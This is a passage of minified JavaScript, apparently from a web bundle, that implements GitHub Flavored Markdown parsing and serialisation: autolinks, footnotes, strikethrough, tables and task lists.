E=T[T.length-1],_=s[l][0],S=s[l][1];let I=0;const P=E.children.indexOf(g);let w=!1,Q=[];_.lastIndex=0;let j=_.exec(g.value);for(;j;){const ie=j.index,de={index:j.index,input:j.input,stack:[...T,g]};let z=S(...j,de);if(typeof z=="string"&&(z=z.length>0?{type:"text",value:z}:void 0),z===!1?_.lastIndex=ie+1:(I!==ie&&Q.push({type:"text",value:g.value.slice(I,ie)}),Array.isArray(z)?Q.push(...z):z&&Q.push(z),I=ie+j[0].length,w=!0),!_.global)break;j=_.exec(g.value)}return w?(I<g.value.length&&Q.push({type:"text",value:g.value.slice(I)}),E.children.splice(P,1,...Q)):Q=[g],P+Q.length}}function ck(e){const t=[];if(!Array.isArray(e))throw new TypeError("Expected find and replace tuple or list of tuples");const r=!e[0]||Array.isArray(e[0])?e:[e];let a=-1;for(;++a<r.length;){const o=r[a];t.push([dk(o[0]),fk(o[1])])}return t}function dk(e){return typeof e=="string"?new RegExp(sk(e),"g"):e}function fk(e){return typeof e=="function"?e:function(){return e}}const Xl="phrasing",Gl=["autolink","link","image","label"];function hk(){return{transforms:[_k],enter:{literalAutolink:mk,literalAutolinkEmail:Vl,literalAutolinkHttp:Vl,literalAutolinkWww:Vl},exit:{literalAutolink:bk,literalAutolinkEmail:Tk,literalAutolinkHttp:gk,literalAutolinkWww:Ek}}}function pk(){return{unsafe:[{character:"@",before:"[+\\-.\\w]",after:"[\\-.\\w]",inConstruct:Xl,notInConstruct:Gl},{character:".",before:"[Ww]",after:"[\\-.\\w]",inConstruct:Xl,notInConstruct:Gl},{character:":",before:"[ps]",after:"\\/",inConstruct:Xl,notInConstruct:Gl}]}}function mk(e){this.enter({type:"link",title:null,url:"",children:[]},e)}function Vl(e){this.config.enter.autolinkProtocol.call(this,e)}function gk(e){this.config.exit.autolinkProtocol.call(this,e)}function Ek(e){this.config.exit.data.call(this,e);const t=this.stack[this.stack.length-1];t.type,t.url="http://"+this.sliceSerialize(e)}function Tk(e){this.config.exit.autolinkEmail.call(this,e)}function bk(e){this.exit(e)}function _k(e){lk(e,[[/(https?:\/\/|www(?=\.))([-.\w]+)([^ \t\r\n]*)/gi,Sk],[new RegExp("(?<=^|\\s|\\p{P}|\\p{S})([-.\\w+]+)@([-\\w]+(?:\\.[-\\w]+)+)","gu"),yk]],{ignore:["link","linkReference"]})}function Sk(e,t,r,a,o){let s="";if(!jm(o)||(/^w/i.test(t)&&(r=t+r,t="",s="http://"),!Ck(r)))return!1;const l=xk(r+a);if(!l[0])return!1;const h={type:"link",title:null,url:s+t+l[0],children:[{type:"text",value:t+l[0]}]};return l[1]?[h,{type:"text",value:l[1]}]:h}function yk(e,t,r,a){return!jm(a,!0)||/[-\d_]$/.test(r)?!1:{type:"link",title:null,url:"mailto:"+t+"@"+r,children:[{type:"text",value:t+"@"+r}]}}function Ck(e){const t=e.split(".");return!(t.length<2||t[t.length-1]&&(/_/.test(t[t.length-1])||!/[a-zA-Z\d]/.test(t[t.length-1]))||t[t.length-2]&&(/_/.test(t[t.length-2])||!/[a-zA-Z\d]/.test(t[t.length-2])))}function xk(e){const t=/[!"&'),.:;<>?\]}]+$/.exec(e);if(!t)return[e,void 0];e=e.slice(0,t.index);let r=t[0],a=r.indexOf(")");const o=$h(e,"(");let s=$h(e,")");for(;a!==-1&&o>s;)e+=r.slice(0,a+1),r=r.slice(a+1),a=r.indexOf(")"),s++;return[e,r]}function jm(e,t){const r=e.input.charCodeAt(e.index-1);return(e.index===0||Rr(r)||No(r))&&(!t||r!==47)}Qm.peek=Pk;function Ak(){this.buffer()}function Lk(e){this.enter({type:"footnoteReference",identifier:"",label:""},e)}function kk(){this.buffer()}function Ik(e){this.enter({type:"footnoteDefinition",identifier:"",label:"",children:[]},e)}function Nk(e){const t=this.resume(),r=this.stack[this.stack.length-1];r.type,r.identifier=sn(this.sliceSerialize(e)).toLowerCase(),r.label=t}function vk(e){this.exit(e)}function Rk(e){const t=this.resume(),r=this.stack[this.stack.length-1];r.type,r.identifier=sn(this.sliceSerialize(e)).toLowerCase(),r.label=t}function Ok(e){this.exit(e)}function Pk(){return"["}function Qm(e,t,r,a){const o=r.createTracker(a);let s=o.move("[^");const l=r.enter("footnoteReference"),h=r.enter("reference");return s+=o.move(r.safe(r.associationId(e),{after:"]",before:s})),h(),l(),s+=o.move("]"),s}function wk(){return{enter:{gfmFootnoteCallString:Ak,gfmFootnoteCall:Lk,gfmFootnoteDefinitionLabelString:kk,gfmFootnoteDefinition:Ik},exit:{gfmFootnoteCallString:Nk,gfmFootnoteCall:vk,gfmFootnoteDefinitionLabelString:Rk,gfmFootnoteDefinition:Ok}}}function Dk(e){let t=!1;return e&&e.firstLineBlank&&(t=!0),{handlers:{footnoteDefinition:r,footnoteReference:Qm},unsafe:[{character:"[",inConstruct:["label","phrasing","reference"]}]};function r(a,o,s,l){const h=s.createTracker(l);let p=h.move("[^");const g=s.enter("footnoteDefinition"),T=s.enter("label");return p+=h.move(s.safe(s.associationId(a),{before:p,after:"]"})),T(),p+=h.move("]:"),a.children&&a.children.length>0&&(h.shift(4),p+=h.move((t?`
`:" ")+s.indentLines(s.containerFlow(a,h.current()),t?Ym:Mk))),g(),p}}function Mk(e,t,r){return t===0?e:Ym(e,t,r)}function Ym(e,t,r){return(r?"":"    ")+e}const Fk=["autolink","destinationLiteral","destinationRaw","reference","titleQuote","titleApostrophe"];Xm.peek=Wk;function Bk(){return{canContainEols:["delete"],enter:{strikethrough:Uk},exit:{strikethrough:zk}}}function Hk(){return{unsafe:[{character:"~",inConstruct:"phrasing",notInConstruct:Fk}],handlers:{delete:Xm}}}function Uk(e){this.enter({type:"delete",children:[]},e)}function zk(e){this.exit(e)}function Xm(e,t,r,a){const o=r.createTracker(a),s=r.enter("strikethrough");let l=o.move("~~");return l+=r.containerPhrasing(e,{...o.current(),before:l,after:"~"}),l+=o.move("~~"),s(),l}function Wk(){return"~"}function jk(e){return e.length}function Qk(e,t){const r=t||{},a=(r.align||[]).concat(),o=r.stringLength||jk,s=[],l=[],h=[],p=[];let g=0,T=-1;for(;++T<e.length;){const F=[],P=[];let w=-1;for(e[T].length>g&&(g=e[T].length);++w<e[T].length;){const Q=Yk(e[T][w]);if(r.alignDelimiters!==!1){const j=o(Q);P[w]=j,(p[w]===void 0||j>p[w])&&(p[w]=j)}F.push(Q)}l[T]=F,h[T]=P}let E=-1;if(typeof a=="object"&&"length"in a)for(;++E<g;)s[E]=qh(a[E]);else{const F=qh(a);for(;++E<g;)s[E]=F}E=-1;const _=[],S=[];for(;++E<g;){const F=s[E];let P="",w="";F===99?(P=":",w=":"):F===108?P=":":F===114&&(w=":");let Q=r.alignDelimiters===!1?1:Math.max(1,p[E]-P.length-w.length);const j=P+"-".repeat(Q)+w;r.alignDelimiters!==!1&&(Q=P.length+Q+w.length,Q>p[E]&&(p[E]=Q),S[E]=Q),_[E]=j}l.splice(1,0,_),h.splice(1,0,S),T=-1;const I=[];for(;++T<l.length;){const F=l[T],P=h[T];E=-1;const w=[];for(;++E<g;){const Q=F[E]||"";let j="",ie="";if(r.alignDelimiters!==!1){const de=p[E]-(P[E]||0),z=s[E];z===114?j=" ".repeat(de):z===99?de%2?(j=" ".repeat(de/2+.5),ie=" ".repeat(de/2-.5)):(j=" ".repeat(de/2),ie=j):ie=" ".repeat(de)}r.delimiterStart!==!1&&!E&&w.push("|"),r.padding!==!1&&!(r.alignDelimiters===!1&&Q==="")&&(r.delimiterStart!==!1||E)&&w.push(" "),r.alignDelimiters!==!1&&w.push(j),w.push(Q),r.alignDelimiters!==!1&&w.push(ie),r.padding!==!1&&w.push(" "),(r.delimiterEnd!==!1||E!==g-1)&&w.push("|")}I.push(r.delimiterEnd===!1?w.join("").replace(/ +$/,""):w.join(""))}return I.join(`
`)}function Yk(e){return e==null?"":String(e)}function qh(e){const t=typeof e=="string"?e.codePointAt(0):0;return t===67||t===99?99:t===76||t===108?108:t===82||t===114?114:0}function Xk(e,t,r,a){const o=r.enter("blockquote"),s=r.createTracker(a);s.move("> "),s.shift(2);const l=r.indentLines(r.containerFlow(e,s.current()),Gk);return o(),l}function Gk(e,t,r){return">"+(r?"":" ")+e}function Vk(e,t){return Kh(e,t.inConstruct,!0)&&!Kh(e,t.notInConstruct,!1)}function Kh(e,t,r){if(typeof t=="string"&&(t=[t]),!t||t.length===0)return r;let a=-1;for(;++a<t.length;)if(e.includes(t[a]))return!0;return!1}function Jh(e,t,r,a){let o=-1;for(;++o<r.unsafe.length;)if(r.unsafe[o].character===`
`&&Vk(r.stack,r.unsafe[o]))return/[ \t]/.test(a.before)?"":" ";return`\\
`}function $k(e,t){const r=String(e);let a=r.indexOf(t),o=a,s=0,l=0;if(typeof t!="string")throw new TypeError("Expected substring");for(;a!==-1;)a===o?++s>l&&(l=s):s=1,o=a+t.length,a=r.indexOf(t,o);return l}function qk(e,t){return!!(t.options.fences===!1&&e.value&&!e.lang&&/[^ \r\n]/.test(e.value)&&!/^[\t ]*(?:[\r\n]|$)|(?:^|[\r\n])[\t ]*$/.test(e.value))}function Kk(e){const t=e.options.fence||"`";if(t!=="`"&&t!=="~")throw new Error("Cannot serialize code with `"+t+"` for `options.fence`, expected `` ` `` or `~`");return t}function Jk(e,t,r,a){const o=Kk(r),s=e.value||"",l=o==="`"?"GraveAccent":"Tilde";if(qk(e,r)){const E=r.enter("codeIndented"),_=r.indentLines(s,Zk);return E(),_}const h=r.createTracker(a),p=o.repeat(Math.max($k(s,o)+1,3)),g=r.enter("codeFenced");let T=h.move(p);if(e.lang){const E=r.enter(`codeFencedLang${l}`);T+=h.move(r.safe(e.lang,{before:T,after:" ",encode:["`"],...h.current()})),E()}if(e.lang&&e.meta){const E=r.enter(`codeFencedMeta${l}`);T+=h.move(" "),T+=h.move(r.safe(e.meta,{before:T,after:`
`,encode:["`"],...h.current()})),E()}return T+=h.move(`
`),s&&(T+=h.move(s+`
`)),T+=h.move(p),g(),T}function Zk(e,t,r){return(r?"":"    ")+e}function Fc(e){const t=e.options.quote||'"';if(t!=='"'&&t!=="'")throw new Error("Cannot serialize title with `"+t+"` for `options.quote`, expected `\"`, or `'`");return t}function eI(e,t,r,a){const o=Fc(r),s=o==='"'?"Quote":"Apostrophe",l=r.enter("definition");let h=r.enter("label");const p=r.createTracker(a);let g=p.move("[");return g+=p.move(r.safe(r.associationId(e),{before:g,after:"]",...p.current()})),g+=p.move("]: "),h(),!e.url||/[\0- \u007F]/.test(e.url)?(h=r.enter("destinationLiteral"),g+=p.move("<"),g+=p.move(r.safe(e.url,{before:g,after:">",...p.current()})),g+=p.move(">")):(h=r.enter("destinationRaw"),g+=p.move(r.safe(e.url,{before:g,after:e.title?" ":`
`,...p.current()}))),h(),e.title&&(h=r.enter(`title${s}`),g+=p.move(" "+o),g+=p.move(r.safe(e.title,{before:g,after:o,...p.current()})),g+=p.move(o),h()),l(),g}function tI(e){const t=e.options.emphasis||"*";if(t!=="*"&&t!=="_")throw new Error("Cannot serialize emphasis with `"+t+"` for `options.emphasis`, expected `*`, or `_`");return t}function wa(e){return"&#x"+e.toString(16).toUpperCase()+";"}function So(e,t,r){const a=gi(e),o=gi(t);return a===void 0?o===void 0?r==="_"?{inside:!0,outside:!0}:{inside:!1,outside:!1}:o===1?{inside:!0,outside:!0}:{inside:!1,outside:!0}:a===1?o===void 0?{inside:!1,outside:!1}:o===1?{inside:!0,outside:!0}:{inside:!1,outside:!1}:o===void 0?{inside:!1,outside:!1}:o===1?{inside:!0,outside:!1}:{inside:!1,outside:!1}}Gm.peek=nI;function Gm(e,t,r,a){const o=tI(r),s=r.enter("emphasis"),l=r.createTracker(a),h=l.move(o);let p=l.move(r.containerPhrasing(e,{after:o,before:h,...l.current()}));const g=p.charCodeAt(0),T=So(a.before.charCodeAt(a.before.length-1),g,o);T.inside&&(p=wa(g)+p.slice(1));const E=p.charCodeAt(p.length-1),_=So(a.after.charCodeAt(0),E,o);_.inside&&(p=p.slice(0,-1)+wa(E));const S=l.move(o);return s(),r.attentionEncodeSurroundingInfo={after:_.outside,before:T.outside},h+p+S}function nI(e,t,r){return r.options.emphasis||"*"}function rI(e,t){let r=!1;return wo(e,function(a){if("value"in a&&/\r?\n|\r/.test(a.value)||a.type==="break")return r=!0,sc}),!!((!e.depth||e.depth<3)&&Cc(e)&&(t.options.setext||r))}function iI(e,t,r,a){const o=Math.max(Math.min(6,e.depth||1),1),s=r.createTracker(a);if(rI(e,r)){const T=r.enter("headingSetext"),E=r.enter("phrasing"),_=r.containerPhrasing(e,{...s.current(),before:`
`,after:`
`});return E(),T(),_+`
`+(o===1?"=":"-").repeat(_.length-(Math.max(_.lastIndexOf("\r"),_.lastIndexOf(`
`))+1))}const l="#".repeat(o),h=r.enter("headingAtx"),p=r.enter("phrasing");s.move(l+" ");let g=r.containerPhrasing(e,{before:"# ",after:`
`,...s.current()});return/^[\t ]/.test(g)&&(g=wa(g.charCodeAt(0))+g.slice(1)),g=g?l+" "+g:l,r.options.closeAtx&&(g+=" "+l),p(),h(),g}Vm.peek=aI;function Vm(e){return e.value||""}function aI(){return"<"}$m.peek=uI;function $m(e,t,r,a){const o=Fc(r),s=o==='"'?"Quote":"Apostrophe",l=r.enter("image");let h=r.enter("label");const p=r.createTracker(a);let g=p.move("![");return g+=p.move(r.safe(e.alt,{before:g,after:"]",...p.current()})),g+=p.move("]("),h(),!e.url&&e.title||/[\0- \u007F]/.test(e.url)?(h=r.enter("destinationLiteral"),g+=p.move("<"),g+=p.move(r.safe(e.url,{before:g,after:">",...p.current()})),g+=p.move(">")):(h=r.enter("destinationRaw"),g+=p.move(r.safe(e.url,{before:g,after:e.title?" ":")",...p.current()}))),h(),e.title&&(h=r.enter(`title${s}`),g+=p.move(" "+o),g+=p.move(r.safe(e.title,{before:g,after:o,...p.current()})),g+=p.move(o),h()),g+=p.move(")"),l(),g}function uI(){return"!"}qm.peek=oI;function qm(e,t,r,a){const o=e.referenceType,s=r.enter("imageReference");let l=r.enter("label");const h=r.createTracker(a);let p=h.move("![");const g=r.safe(e.alt,{before:p,after:"]",...h.current()});p+=h.move(g+"]["),l();const T=r.stack;r.stack=[],l=r.enter("reference");const E=r.safe(r.associationId(e),{before:p,after:"]",...h.current()});return l(),r.stack=T,s(),o==="full"||!g||g!==E?p+=h.move(E+"]"):o==="shortcut"?p=p.slice(0,-1):p+=h.move("]"),p}function oI(){return"!"}Km.peek=sI;function Km(e,t,r){let a=e.value||"",o="`",s=-1;for(;new RegExp("(^|[^`])"+o+"([^`]|$)").test(a);)o+="`";for(/[^ \r\n]/.test(a)&&(/^[ \r\n]/.test(a)&&/[ \r\n]$/.test(a)||/^`|`$/.test(a))&&(a=" "+a+" ");++s<r.unsafe.length;){const l=r.unsafe[s],h=r.compilePattern(l);let p;if(l.atBreak)for(;p=h.exec(a);){let g=p.index;a.charCodeAt(g)===10&&a.charCodeAt(g-1)===13&&g--,a=a.slice(0,g)+" "+a.slice(p.index+1)}}return o+a+o}function sI(){return"`"}function Jm(e,t){const r=Cc(e);return!!(!t.options.resourceLink&&e.url&&!e.title&&e.children&&e.children.length===1&&e.children[0].type==="text"&&(r===e.url||"mailto:"+r===e.url)&&/^[a-z][a-z+.-]+:/i.test(e.url)&&!/[\0- <>\u007F]/.test(e.url))}Zm.peek=lI;function Zm(e,t,r,a){const o=Fc(r),s=o==='"'?"Quote":"Apostrophe",l=r.createTracker(a);let h,p;if(Jm(e,r)){const T=r.stack;r.stack=[],h=r.enter("autolink");let E=l.move("<");return E+=l.move(r.containerPhrasing(e,{before:E,after:">",...l.current()})),E+=l.move(">"),h(),r.stack=T,E}h=r.enter("link"),p=r.enter("label");let g=l.move("[");return g+=l.move(r.containerPhrasing(e,{before:g,after:"](",...l.current()})),g+=l.move("]("),p(),!e.url&&e.title||/[\0- \u007F]/.test(e.url)?(p=r.enter("destinationLiteral"),g+=l.move("<"),g+=l.move(r.safe(e.url,{before:g,after:">",...l.current()})),g+=l.move(">")):(p=r.enter("destinationRaw"),g+=l.move(r.safe(e.url,{before:g,after:e.title?" ":")",...l.current()}))),p(),e.title&&(p=r.enter(`title${s}`),g+=l.move(" "+o),g+=l.move(r.safe(e.title,{before:g,after:o,...l.current()})),g+=l.move(o),p()),g+=l.move(")"),h(),g}function lI(e,t,r){return Jm(e,r)?"<":"["}e1.peek=cI;function e1(e,t,r,a){const o=e.referenceType,s=r.enter("linkReference");let l=r.enter("label");const h=r.createTracker(a);let p=h.move("[");const g=r.containerPhrasing(e,{before:p,after:"]",...h.current()});p+=h.move(g+"]["),l();const T=r.stack;r.stack=[],l=r.enter("reference");const E=r.safe(r.associationId(e),{before:p,after:"]",...h.current()});return l(),r.stack=T,s(),o==="full"||!g||g!==E?p+=h.move(E+"]"):o==="shortcut"?p=p.slice(0,-1):p+=h.move("]"),p}function cI(){return"["}function Bc(e){const t=e.options.bullet||"*";if(t!=="*"&&t!=="+"&&t!=="-")throw new Error("Cannot serialize items with `"+t+"` for `options.bullet`, expected `*`, `+`, or `-`");return t}function dI(e){const t=Bc(e),r=e.options.bulletOther;if(!r)return t==="*"?"-":"*";if(r!=="*"&&r!=="+"&&r!=="-")throw new Error("Cannot serialize items with `"+r+"` for `options.bulletOther`, expected `*`, `+`, or `-`");if(r===t)throw new Error("Expected `bullet` (`"+t+"`) and `bulletOther` (`"+r+"`) to be different");return r}function fI(e){const t=e.options.bulletOrdered||".";if(t!=="."&&t!==")")throw new Error("Cannot serialize items with `"+t+"` for `options.bulletOrdered`, expected `.` or `)`");return t}function t1(e){const t=e.options.rule||"*";if(t!=="*"&&t!=="-"&&t!=="_")throw new Error("Cannot serialize rules with `"+t+"` for `options.rule`, expected `*`, `-`, or `_`");return t}function hI(e,t,r,a){const o=r.enter("list"),s=r.bulletCurrent;let l=e.ordered?fI(r):Bc(r);const h=e.ordered?l==="."?")":".":dI(r);let p=t&&r.bulletLastUsed?l===r.bulletLastUsed:!1;if(!e.ordered){const T=e.children?e.children[0]:void 0;if((l==="*"||l==="-")&&T&&(!T.children||!T.children[0])&&r.stack[r.stack.length-1]==="list"&&r.stack[r.stack.length-2]==="listItem"&&r.stack[r.stack.length-3]==="list"&&r.stack[r.stack.length-4]==="listItem"&&r.indexStack[r.indexStack.length-1]===0&&r.indexStack[r.indexStack.length-2]===0&&r.indexStack[r.indexStack.length-3]===0&&(p=!0),t1(r)===l&&T){let E=-1;for(;++E<e.children.length;){const _=e.children[E];if(_&&_.type==="listItem"&&_.children&&_.children[0]&&_.children[0].type==="thematicBreak"){p=!0;break}}}}p&&(l=h),r.bulletCurrent=l;const g=r.containerFlow(e,a);return r.bulletLastUsed=l,r.bulletCurrent=s,o(),g}function pI(e){const t=e.options.listItemIndent||"one";if(t!=="tab"&&t!=="one"&&t!=="mixed")throw new Error("Cannot serialize items with `"+t+"` for `options.listItemIndent`, expected `tab`, `one`, or `mixed`");return t}function mI(e,t,r,a){const o=pI(r);let s=r.bulletCurrent||Bc(r);t&&t.type==="list"&&t.ordered&&(s=(typeof t.start=="number"&&t.start>-1?t.start:1)+(r.options.incrementListMarker===!1?0:t.children.indexOf(e))+s);let l=s.length+1;(o==="tab"||o==="mixed"&&(t&&t.type==="list"&&t.spread||e.spread))&&(l=Math.ceil(l/4)*4);const h=r.createTracker(a);h.move(s+" ".repeat(l-s.length)),h.shift(l);const p=r.enter("listItem"),g=r.indentLines(r.containerFlow(e,h.current()),T);return p(),g;function T(E,_,S){return _?(S?"":" ".repeat(l))+E:(S?s:s+" ".repeat(l-s.length))+E}}function gI(e,t,r,a){const o=r.enter("paragraph"),s=r.enter("phrasing"),l=r.containerPhrasing(e,a);return s(),o(),l}const EI=Oo(["break","delete","emphasis","footnote","footnoteReference","image","imageReference","inlineCode","inlineMath","link","linkReference","mdxJsxTextElement","mdxTextExpression","strong","text","textDirective"]);function TI(e,t,r,a){return(e.children.some(function(l){return EI(l)})?r.containerPhrasing:r.containerFlow).call(r,e,a)}function bI(e){const t=e.options.strong||"*";if(t!=="*"&&t!=="_")throw new Error("Cannot serialize strong with `"+t+"` for `options.strong`, expected `*`, or `_`");return t}n1.peek=_I;function n1(e,t,r,a){const o=bI(r),s=r.enter("strong"),l=r.createTracker(a),h=l.move(o+o);let p=l.move(r.containerPhrasing(e,{after:o,before:h,...l.current()}));const g=p.charCodeAt(0),T=So(a.before.charCodeAt(a.before.length-1),g,o);T.inside&&(p=wa(g)+p.slice(1));const E=p.charCodeAt(p.length-1),_=So(a.after.charCodeAt(0),E,o);_.inside&&(p=p.slice(0,-1)+wa(E));const S=l.move(o+o);return s(),r.attentionEncodeSurroundingInfo={after:_.outside,before:T.outside},h+p+S}function _I(e,t,r){return r.options.strong||"*"}function SI(e,t,r,a){return r.safe(e.value,a)}function yI(e){const t=e.options.ruleRepetition||3;if(t<3)throw new Error("Cannot serialize rules with repetition `"+t+"` for `options.ruleRepetition`, expected `3` or more");return t}function CI(e,t,r){const a=(t1(r)+(r.options.ruleSpaces?" ":"")).repeat(yI(r));return r.options.ruleSpaces?a.slice(0,-1):a}const r1={blockquote:Xk,break:Jh,code:Jk,definition:eI,emphasis:Gm,hardBreak:Jh,heading:iI,html:Vm,image:$m,imageReference:qm,inlineCode:Km,link:Zm,linkReference:e1,list:hI,listItem:mI,paragraph:gI,root:TI,strong:n1,text:SI,thematicBreak:CI};function xI(){return{enter:{table:AI,tableData:Zh,tableHeader:Zh,tableRow:kI},exit:{codeText:II,table:LI,tableData:$l,tableHeader:$l,tableRow:$l}}}function AI(e){const t=e._align;this.enter({type:"table",align:t.map(function(r){return r==="none"?null:r}),children:[]},e),this.data.inTable=!0}function LI(e){this.exit(e),this.data.inTable=void 0}function kI(e){this.enter({type:"tableRow",children:[]},e)}function $l(e){this.exit(e)}function Zh(e){this.enter({type:"tableCell",children:[]},e)}function II(e){let t=this.resume();this.data.inTable&&(t=t.replace(/\\([\\|])/g,NI));const r=this.stack[this.stack.length-1];r.type,r.value=t,this.exit(e)}function NI(e,t){return t==="|"?t:e}function vI(e){const t=e||{},r=t.tableCellPadding,a=t.tablePipeAlign,o=t.stringLength,s=r?" ":"|";return{unsafe:[{character:"\r",inConstruct:"tableCell"},{character:`
`,inConstruct:"tableCell"},{atBreak:!0,character:"|",after:"[	 :-]"},{character:"|",inConstruct:"tableCell"},{atBreak:!0,character:":",after:"-"},{atBreak:!0,character:"-",after:"[:|-]"}],handlers:{inlineCode:_,table:l,tableCell:p,tableRow:h}};function l(S,I,F,P){return g(T(S,F,P),S.align)}function h(S,I,F,P){const w=E(S,F,P),Q=g([w]);return Q.slice(0,Q.indexOf(`
`))}function p(S,I,F,P){const w=F.enter("tableCell"),Q=F.enter("phrasing"),j=F.containerPhrasing(S,{...P,before:s,after:s});return Q(),w(),j}function g(S,I){return Qk(S,{align:I,alignDelimiters:a,padding:r,stringLength:o})}function T(S,I,F){const P=S.children;let w=-1;const Q=[],j=I.enter("table");for(;++w<P.length;)Q[w]=E(P[w],I,F);return j(),Q}function E(S,I,F){const P=S.children;let w=-1;const Q=[],j=I.enter("tableRow");for(;++w<P.length;)Q[w]=p(P[w],S,I,F);return j(),Q}function _(S,I,F){let P=r1.inlineCode(S,I,F);return F.stack.includes("tableCell")&&(P=P.replace(/\|/g,"\\$&")),P}}function RI(){return{exit:{taskListCheckValueChecked:ep,taskListCheckValueUnchecked:ep,paragraph:PI}}}function OI(){return{unsafe:[{atBreak:!0,character:"-",after:"[:|-]"}],handlers:{listItem:wI}}}function ep(e){const t=this.stack[this.stack.length-2];t.type,t.checked=e.type==="taskListCheckValueChecked"}function PI(e){const t=this.stack[this.stack.length-2];if(t&&t.type==="listItem"&&typeof t.checked=="boolean"){const r=this.stack[this.stack.length-1];r.type;const a=r.children[0];if(a&&a.type==="text"){const o=t.children;let s=-1,l;for(;++s<o.length;){const h=o[s];if(h.type==="paragraph"){l=h;break}}l===r&&(a.value=a.value.slice(1),a.value.length===0?r.children.shift():r.position&&a.position&&typeof a.position.start.offset=="number"&&(a.position.start.column++,a.position.start.offset++,r.position.start=Object.assign({},a.position.start)))}}this.exit(e)}function wI(e,t,r,a){const o=e.children[0],s=typeof e.checked=="boolean"&&o&&o.type==="paragraph",l="["+(e.checked?"x":" ")+"] ",h=r.createTracker(a);s&&h.move(l);let p=r1.listItem(e,t,r,{...a,...h.current()});return s&&(p=p.replace(/^(?:[*+-]|\d+\.)([\r\n]| {1,3})/,g)),p;function g(T){return T+l}}function DI(){return[hk(),wk(),Bk(),xI(),RI()]}function MI(e){return{extensions:[pk(),Dk(e),Hk(),vI(e),OI()]}}const FI={tokenize:jI,partial:!0},i1={tokenize:QI,partial:!0},a1={tokenize:YI,partial:!0},u1={tokenize:XI,partial:!0},BI={tokenize:GI,partial:!0},o1={name:"wwwAutolink",tokenize:zI,previous:l1},s1={name:"protocolAutolink",tokenize:WI,previous:c1},On={name:"emailAutolink",tokenize:UI,previous:d1},bn={};function HI(){return{text:bn}}let Lr=48;for(;Lr<123;)bn[Lr]=On,Lr++,Lr===58?Lr=65:Lr===91&&(Lr=97);bn[43]=On;bn[45]=On;bn[46]=On;bn[95]=On;bn[72]=[On,s1];bn[104]=[On,s1];bn[87]=[On,o1];bn[119]=[On,o1];function UI(e,t,r){const a=this;let o,s;return l;function l(E){return!Ec(E)||!d1.call(a,a.previous)||Hc(a.events)?r(E):(e.enter("literalAutolink"),e.enter("literalAutolinkEmail"),h(E))}function h(E){return Ec(E)?(e.consume(E),h):E===64?(e.consume(E),p):r(E)}function p(E){return E===46?e.check(BI,T,g)(E):E===45||E===95||St(E)?(s=!0,e.consume(E),p):T(E)}function g(E){return e.consume(E),o=!0,p}function T(E){return s&&o&&Lt(a.previous)?(e.exit("literalAutolinkEmail"),e.exit("literalAutolink"),t(E)):r(E)}}function zI(e,t,r){const a=this;return o;function o(l){return l!==87&&l!==119||!l1.call(a,a.previous)||Hc(a.events)?r(l):(e.enter("literalAutolink"),e.enter("literalAutolinkWww"),e.check(FI,e.attempt(i1,e.attempt(a1,s),r),r)(l))}function s(l){return e.exit("literalAutolinkWww"),e.exit("literalAutolink"),t(l)}}function WI(e,t,r){const a=this;let o="",s=!1;return l;function l(E){return(E===72||E===104)&&c1.call(a,a.previous)&&!Hc(a.events)?(e.enter("literalAutolink"),e.enter("literalAutolinkHttp"),o+=String.fromCodePoint(E),e.consume(E),h):r(E)}function h(E){if(Lt(E)&&o.length<5)return o+=String.fromCodePoint(E),e.consume(E),h;if(E===58){const _=o.toLowerCase();if(_==="http"||_==="https")return e.consume(E),p}return r(E)}function p(E){return E===47?(e.consume(E),s?g:(s=!0,p)):r(E)}function g(E){return E===null||go(E)||We(E)||Rr(E)||No(E)?r(E):e.attempt(i1,e.attempt(a1,T),r)(E)}function T(E){return e.exit("literalAutolinkHttp"),e.exit("literalAutolink"),t(E)}}function jI(e,t,r){let a=0;return o;function o(l){return(l===87||l===119)&&a<3?(a++,e.consume(l),o):l===46&&a===3?(e.consume(l),s):r(l)}function s(l){return l===null?r(l):t(l)}}function QI(e,t,r){let a,o,s;return l;function l(g){return g===46||g===95?e.check(u1,p,h)(g):g===null||We(g)||Rr(g)||g!==45&&No(g)?p(g):(s=!0,e.consume(g),l)}function h(g){return g===95?a=!0:(o=a,a=void 0),e.consume(g),l}function p(g){return o||a||!s?r(g):t(g)}}function YI(e,t){let r=0,a=0;return o;function o(l){return l===40?(r++,e.consume(l),o):l===41&&a<r?s(l):l===33||l===34||l===38||l===39||l===41||l===42||l===44||l===46||l===58||l===59||l===60||l===63||l===93||l===95||l===126?e.check(u1,t,s)(l):l===null||We(l)||Rr(l)?t(l):(e.consume(l),o)}function s(l){return l===41&&a++,e.consume(l),o}}function XI(e,t,r){return a;function a(h){return h===33||h===34||h===39||h===41||h===42||h===44||h===46||h===58||h===59||h===63||h===95||h===126?(e.consume(h),a):h===38?(e.consume(h),s):h===93?(e.consume(h),o):h===60||h===null||We(h)||Rr(h)?t(h):r(h)}function o(h){return h===null||h===40||h===91||We(h)||Rr(h)?t(h):a(h)}function s(h){return Lt(h)?l(h):r(h)}function l(h){return h===59?(e.consume(h),a):Lt(h)?(e.consume(h),l):r(h)}}function GI(e,t,r){return a;function a(s){return e.consume(s),o}function o(s){return St(s)?r(s):t(s)}}function l1(e){return e===null||e===40||e===42||e===95||e===91||e===93||e===126||We(e)}function c1(e){return!Lt(e)}function d1(e){return!(e===47||Ec(e))}function Ec(e){return e===43||e===45||e===46||e===95||St(e)}function Hc(e){let t=e.length,r=!1;for(;t--;){const a=e[t][1];if((a.type==="labelLink"||a.type==="labelImage")&&!a._balanced){r=!0;break}if(a._gfmAutolinkLiteralWalkedInto){r=!1;break}}return e.length>0&&!r&&(e[e.length-1][1]._gfmAutolinkLiteralWalkedInto=!0),r}const VI={tokenize:nN,partial:!0};function $I(){return{document:{91:{name:"gfmFootnoteDefinition",tokenize:ZI,continuation:{tokenize:eN},exit:tN}},text:{91:{name:"gfmFootnoteCall",tokenize:JI},93:{name:"gfmPotentialFootnoteCall",add:"after",tokenize:qI,resolveTo:KI}}}}function qI(e,t,r){const a=this;let o=a.events.length;const s=a.parser.gfmFootnotes||(a.parser.gfmFootnotes=[]);let l;for(;o--;){const p=a.events[o][1];if(p.type==="labelImage"){l=p;break}if(p.type==="gfmFootnoteCall"||p.type==="labelLink"||p.type==="label"||p.type==="image"||p.type==="link")break}return h;function h(p){if(!l||!l._balanced)return r(p);const g=sn(a.sliceSerialize({start:l.end,end:a.now()}));return g.codePointAt(0)!==94||!s.includes(g.slice(1))?r(p):(e.enter("gfmFootnoteCallLabelMarker"),e.consume(p),e.exit("gfmFootnoteCallLabelMarker"),t(p))}}function KI(e,t){let 